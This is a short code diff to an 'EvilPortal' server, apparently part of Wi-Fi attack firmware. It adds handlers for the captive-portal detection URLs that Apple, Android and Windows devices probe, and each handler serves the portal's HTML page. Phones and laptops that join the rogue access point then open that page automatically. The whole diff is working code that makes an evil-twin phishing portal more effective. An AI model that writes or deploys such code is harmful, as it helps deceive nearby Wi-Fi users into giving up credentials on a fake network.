@@ -72,6 +72,30 @@ void EvilPortal::setupServer() {
     });
   #endif
 
+  const char* captiveEndpoints[] = {
+    "/hotspot-detect.html",
+    "/library/test/success.html",
+    "/success.txt",
+    "/generate_204",
+    "/gen_204",
+    "/ncsi.txt",
+    "/connecttest.txt",
+    "/redirect"
+  };
+
+  for (int i = 0; i < sizeof(captiveEndpoints) / sizeof(captiveEndpoints[0]); i++) {
+    
+    #ifndef HAS_PSRAM
+      server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
+        request->send_P(200, "text/html", index_html);
+      });
+    #else
+      server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
+        request->send(200, "text/html", index_html);
+      });
+    #endif
+  }
+
   server.on("/get-ap-name", HTTP_GET, [this](AsyncWebServerRequest *request) {
     request->send(200, "text/plain", WiFi.softAPSSID());
   });
